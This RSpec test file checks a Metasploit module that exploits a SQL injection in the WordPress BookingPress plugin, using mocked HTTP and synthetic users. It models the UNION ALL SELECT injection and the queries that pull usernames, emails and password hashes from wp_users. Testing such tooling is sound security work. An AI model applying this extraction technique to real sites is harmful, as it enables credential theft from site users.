require 'rspec'
require 'msfenv'
require 'msf/base'
require 'rex/text'
require 'metasploit/framework/hashes'

RSpec.describe 'BookingPress SQL injection contracts' do
  subject(:mod) { owner_class.new }

  let(:owner_class) do
    scope = Module.new
    source = ENV.fetch('BOOKINGPRESS_OWNER_SOURCE', File.expand_path('../../../../modules/auxiliary/gather/wp_bookingpress_category_services_sqli.rb', __dir__))
    scope.module_eval(File.binread(source), source)
    scope.const_get(:MetasploitModule).tap { |klass| klass.include(Msf) }
  end
  let(:captures) { JSON.parse(File.read(File.expand_path('../../../file_fixtures/modules/auxiliary/gather/wp_bookingpress_category_services_sqli/responses.json', __dir__))).fetch('responses') }
  let(:profile) { { 'scope' => 'root', 'nonce' => 'UNITNONCE' } }
  let(:page_reply) { :modeled }
  let(:query_reply) { :modeled }
  let(:table_prefix) { 'wp_' }
  let(:prefix_miss) { nil }
  let(:group_limit) { 65_535 }
  let(:bad_row) { false }
  let(:missing_dump_scalar) { false }
  # Inert synthetic phpass value; real native credential values are omitted.
  let(:hash_value) { '$P$B12345678abcdefghijklmnopqrstuv' }
  let(:rows) do
    [
      ['module_admin', 'module-admin@example.test', hash_value],
      ['module_author', 'module-author@example.test', hash_value],
      ['module_reader', 'module-reader@example.test', hash_value],
      ['module_editor', 'module-editor@example.test', hash_value]
    ]
  end
  let(:requests) { [] }
  let(:queries) { [] }
  let(:credentials) { [] }
  let(:lines) { [] }
  let(:framework) { double('Framework', datastore: Msf::DataStore.new) }

  before do
    mod.datastore.merge!('RHOSTS' => '192.0.2.10', 'RHOST' => '192.0.2.10', 'RPORT' => 80, 'SSL' => false, 'AutoCheck' => false)
    allow(mod).to receive(:framework).and_return(framework)
    allow(mod).to receive(:user_output).and_return(Rex::Ui::Text::Output::Buffer.new)
    allow(mod).to receive(:myworkspace_id).and_return(1)
    allow(mod).to receive(:report_vuln)
    allow(mod).to receive(:create_credential) { |data| credentials << data }
    allow(mod).to receive(:print_line) { |text| lines << text }
    %i[print_status print_good print_error print_warning vprint_status vprint_error elog].each { |method| allow(mod).to receive(method) }
    allow(mod).to receive(:rand).and_call_original
    allow(mod).to receive(:rand).with(0..19).and_return(0)
    # HTTP/reporting/UI and the bounded SQL evaluator are doubles. Real Common
    # SQL generation, HEX decoding and WordPress prefix discovery execute.
    allow(mod).to receive(:send_request_cgi) do |options|
      requests << options
      if options.dig('vars_post', 'action') == 'bookingpress_front_get_category_services'
        expected = profile['scope'] == 'prefix' ? '/wordpress/wp-admin/admin-ajax.php' : '/wp-admin/admin-ajax.php'
        if options['uri'] != expected
          reply(404, 'Not Found')
        elsif options.dig('vars_post', '_wpnonce') != profile['nonce']
          response('nonce_error')
        elsif query_reply == :modeled
          sql_response(options)
        else
          query_reply
        end
      elsif page_reply == :modeled
        result = response(profile['scope'] + '_page')
        result.body = result.body.gsub('UNITNONCE', profile['nonce'])
        result
      else
        page_reply
      end
    end
  end

  def reply(code, body = '')
    Rex::Proto::Http::Response.new(code).tap { |result| result.body = body }
  end

  def response(name)
    data = captures.fetch(name)
    reply(data.fetch('code'), data.fetch('body'))
  end

  def scalar(value)
    reply(200, [{ 'bookingpress_service_id' => value }].to_json)
  end

  def sql_response(options)
    injection = options.fetch('vars_post').fetch('total_service')
    sql = injection[/\) UNION ALL SELECT \((.*)\),456,789,12,34,56,78,90,77/m, 1]
    raise ArgumentError, 'Unexpected injection shape in unit adapter' unless sql

    queries << sql
    return response('empty') if (table_prefix != 'wp_' || rows.empty?) && injection.include?(' from wp_users--')

    if (match = sql.match(/\Aselect hex\(0x([0-9a-f]+)\)\z/i))
      scalar(match[1].upcase)
    elsif (match = sql.match(/\Aselect 0x([0-9a-f]+)\z/i))
      scalar([match[1]].pack('H*'))
    elsif sql.include?('information_schema.tables') && sql.match?(/\ASELECT \d+/)
      scalar(table_prefix == 'wp_' ? sql[/\ASELECT (\d+)/, 1] : prefix_miss)
    elsif sql.start_with?('SELECT LEFT(table_name')
      scalar(table_prefix)
    elsif sql.match?(/\Aselect count\(1\) from \w+users\z/i)
      scalar(missing_dump_scalar ? nil : rows.length.to_s)
    elsif (match = sql.match(/from (\w+users) limit (\d+),1\z/i))
      raise ArgumentError, 'Wrong users table in unit query' unless match[1] == table_prefix + 'users'

      index = match[2].to_i
      fields = bad_row && index == 1 ? rows.fetch(index).first(2) : rows.fetch(index)
      scalar(fields.map { |field| field.to_s.b.unpack1('H*').upcase }.join(';'))
    elsif sql.include?('group_concat')
      return scalar(nil) if missing_dump_scalar

      values = rows.each_with_index.map { |row_values, row_number| bad_row && row_number == 1 ? row_values.first(2) : row_values }
      scalar(values.map { |row_values| row_values.join(';') }.join(',').b.byteslice(0, group_limit))
    else
      raise ArgumentError, "Unexpected unit SQL query: #{sql}"
    end
  end

  def rejected(reason)
    expect { mod.run }.to raise_error(Msf::Auxiliary::Failed)
    expect(mod.fail_reason).to eq(reason)
    expect(credentials).to be_empty
  end

  it 'proves SQL injection through the real Common marker comparison' do
    expect(mod.check).to have_attributes(code: 'vulnerable', reason: 'SQL injection test succeeded')
  end

  it 'persists exact user, email and hash values with the original service identity' do
    mod.run
    expect(credentials.map { |data| [data[:username], data[:email], data[:private_data]] }).to eq(rows)
    expect(credentials).to all(include(private_type: :nonreplayable_hash, jtr_format: 'phpass', service_name: 'WordPress BookingPress Plugin', address: '192.0.2.10'))
    expect(lines.join).to include('module-admin@example.test')
  end

  context 'with the genuine subdirectory booking page' do
    let(:profile) { { 'scope' => 'prefix', 'nonce' => 'UNITNONCE' } }

    before { mod.datastore['TARGETURI'] = '/wordpress/bookingpress/' }

    it('checks the scoped AJAX endpoint') { expect(mod.check.code).to eq('vulnerable') }

    it 'collects all credentials through the advertised AJAX path' do
      mod.run
      expect(credentials.map { |data| data[:private_data] }).to eq([hash_value] * 4)
      expect(requests.select { |options| options['vars_post'] }.map { |options| options['uri'] }.uniq).to eq(['/wordpress/wp-admin/admin-ajax.php'])
    end

    it 'preserves a query-style booking page URL and its query bytes' do
      path = '/wordpress/?page_id=7&next=https://example.test/a//b'
      mod.datastore['TARGETURI'] = path
      mod.run
      expect(requests.first.fetch('uri')).to eq(path)
      expect(mod.datastore['TARGETURI']).to eq(path)
    end
  end

  context 'with the genuine patched response' do
    let(:query_reply) { response('empty') }

    it('returns reason-bearing Safe') { expect(mod.check).to have_attributes(code: 'safe', reason: a_string_matching(/SQL injection/)) }
    it('aborts a forced run without credentials') { rejected(Msf::Module::Failure::NotVulnerable) }
  end

  context 'with a custom WordPress table prefix' do
    let(:table_prefix) { 'bp_' }

    it 'bootstraps without wp_users and discovers the actual users table' do
      mod.run
      expect(credentials.map { |data| data[:private_data] }).to eq([hash_value] * 4)
      expect(queries.any? { |query| query.include?('from bp_users') }).to be(true)
    end

    context 'when the default prefix miss is empty text and the random indicator is zero' do
      let(:prefix_miss) { '' }

      it 'still falls back to custom-prefix discovery' do
        mod.run
        expect(queries.any? { |query| query.start_with?('SELECT LEFT(table_name') }).to be(true)
        expect(credentials.length).to eq(4)
      end
    end
  end

  context 'with the native 96-byte aggregation limit' do
    let(:group_limit) { 96 }

    it 'retrieves every complete hash without creating blank-password data' do
      mod.run
      expect(credentials.map { |data| data[:private_data] }).to eq([hash_value] * 4)
      expect(queries.none? { |query| query.include?('group_concat') }).to be(true)
    end
  end

  context 'with synthetic delimiter and UTF-8 field bytes' do
    let(:rows) { [['owned,semi;é雪', 'comma;é@example.test', hash_value]] }

    it 'keeps the entire row intact' do
      mod.run
      expect(credentials.map { |data| [data[:username], data[:email], data[:private_data]] }).to eq(rows)
      expect(credentials.first[:username].encoding).to eq(Encoding::UTF_8)
    end
  end

  context 'with a valid empty users table' do
    let(:rows) { [] }

    it 'prints the empty table without inventing credentials' do
      mod.run
      expect(credentials).to be_empty
      expect(lines.join).to include('Wordpress User Credentials')
    end
  end

  it 'refreshes nonce, endpoint and callback when the target page changes' do
    mod.run
    profile.merge!('scope' => 'prefix', 'nonce' => 'SECONDNONCE')
    mod.datastore['TARGETURI'] = '/wordpress/bookingpress/'
    mod.run
    expect(credentials.map { |data| data[:private_data] }).to eq([hash_value] * 8)
    expect(requests.count { |options| options['uri'] == '/wordpress/bookingpress/' }).to eq(1)
  end

  it 'preserves datastore configuration across repeated execution' do
    settings = mod.datastore.to_h.dup
    2.times { mod.run }
    expect(mod.datastore.to_h).to eq(settings)
  end

  context 'when a later extracted row is incomplete' do
    let(:bad_row) { true }

    it('fails before persisting any row') { rejected(Msf::Module::Failure::UnexpectedReply) }
  end

  context 'when a dump query returns SQL NULL after a successful probe' do
    let(:missing_dump_scalar) { true }

    it('returns UnexpectedReply without a decoder exception') { rejected(Msf::Module::Failure::UnexpectedReply) }
  end

  context 'when the booking page is unanswered' do
    let(:page_reply) { nil }

    it('returns Unknown') { expect(mod.check.code).to eq('unknown') }
    it('returns Unreachable during run') { rejected(Msf::Module::Failure::Unreachable) }
  end

  context 'when AJAX is unanswered' do
    let(:query_reply) { nil }

    it('returns Unknown without LocalJumpError') { expect(mod.check.code).to eq('unknown') }
    it('returns Unreachable during run') { rejected(Msf::Module::Failure::Unreachable) }
  end

  [401, 403, 500].each do |status|
    context "with AJAX HTTP #{status}" do
      let(:query_reply) { reply(status) }

      it('returns Unknown') { expect(mod.check.code).to eq('unknown') }
      it('aborts without credentials') { rejected(status == 500 ? Msf::Module::Failure::UnexpectedReply : Msf::Module::Failure::NoAccess) }
    end
  end

  context 'with the genuine rejected-nonce error object' do
    let(:query_reply) { response('nonce_error') }

    it('returns Unknown rather than Safe') { expect(mod.check.code).to eq('unknown') }
    it('returns NoAccess during run') { rejected(Msf::Module::Failure::NoAccess) }
  end

  ['not JSON', 'null', '{}', '[{}]', '[{"bookingpress_service_id":[]}]'].each do |body|
    context "with malformed service results #{body}" do
      let(:query_reply) { reply(200, body) }

      it('returns Unknown without raising') { expect(mod.check.code).to eq('unknown') }
    end
  end

  context 'with a missing nonce' do
    let(:page_reply) { reply(200, '<html>Unrelated</html>') }

    it('returns Unknown') { expect(mod.check.code).to eq('unknown') }
  end

  context 'with invalid URI configuration' do
    before { mod.datastore['TARGETURI'] = 'http://[invalid' }

    it('returns Unknown without raising') { expect(mod.check.code).to eq('unknown') }
  end

  context 'with a booking page error containing cached script content' do
    let(:page_reply) { reply(404, response('root_page').body) }

    it('returns Unknown rather than using the cached nonce') { expect(mod.check.code).to eq('unknown') }
  end

  context 'with missing AJAX settings' do
    let(:page_reply) { reply(200, '<script>var postData = { _wpnonce:\'UNITNONCE\' };</script>') }

    it('returns Unknown') { expect(mod.check.code).to eq('unknown') }
  end

  [Rex::ConnectionRefused.new, OpenSSL::SSL::SSLError.new('Unit TLS failure')].each do |error|
    context "with expected transport failure #{error.class}" do
      before { allow(mod).to receive(:send_request_cgi).and_raise(error) }

      it 'returns Unknown from check and Unreachable from run' do
        expect(mod.check.code).to eq('unknown')
        rejected(Msf::Module::Failure::Unreachable)
      end
    end
  end

  it 'retains normal AutoCheck collection' do
    mod.datastore['AutoCheck'] = true
    mod.run
    expect(credentials.map { |data| data[:private_data] }).to eq([hash_value] * 4)
  end
end
